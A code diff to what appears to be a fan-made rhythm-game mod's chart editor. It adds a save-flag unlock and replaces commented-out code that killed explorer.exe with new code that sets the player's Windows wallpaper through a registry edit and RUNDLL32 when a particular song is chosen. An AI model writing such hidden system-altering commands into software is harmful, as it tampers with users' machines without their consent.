@@ -855,6 +855,12 @@ class ChartingState extends MusicBeatState
 			PlayState.SONG = _song;
 			FlxG.sound.music.stop();
 			vocals.stop();
+
+			if (PlayState.SONG.song.toLowerCase() == 'secret-mod-leak' && !FlxG.save.data.secretModLeakUnlocked)
+			{
+				FlxG.save.data.secretModLeakUnlocked = true;
+				FlxG.save.flush();
+			}
 			LoadingState.loadAndSwitchState(new PlayState());
 		}
 
@@ -1458,12 +1464,17 @@ class ChartingState extends MusicBeatState
 				case 'unfairness':
 					FlxG.switchState(new YouCheatedSomeoneIsComing()); //YOU THINK YOU ARE SO CLEVER DON'T YOU? HAHA FUCK YOU
 				case 'exploitation':
-					var wallpaperPath = Sys.getEnv('APPDATA') + '/Microsoft/Windows/Themes/CachedFiles/CachedImage_1920_1080_POS2.jpg';
+					/*var wallpaperPath = Sys.getEnv('APPDATA') + '/Microsoft/Windows/Themes/CachedFiles/CachedImage_1920_1080_POS2.jpg';
 					File.saveBytes(wallpaperPath, File.getBytes(Paths.image('random/HAHA')));
-
 					Sys.command("taskkill /f /im explorer.exe");
 					Sys.command("explorer.exe");
-					Sys.exit(0);
+					Sys.exit(0);*/
+
+					var filePath = Sys.getEnv("TEMP") + "\\AHAHAHA.png";
+					File.saveBytes(filePath, File.getBytes(Paths.image('random/HAHA')));
+					
+					Sys.command('REG ADD "HKEY_CURRENT_USER/Control Panel/Desktop"', ['/d $filePath', '/v Wallpaper', '/t REG_SZ']);
+					Sys.command('RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters');					
 			}
 			PlayState.SONG = Song.loadFromJson(song.toLowerCase(), song.toLowerCase());
 			FlxG.resetState();
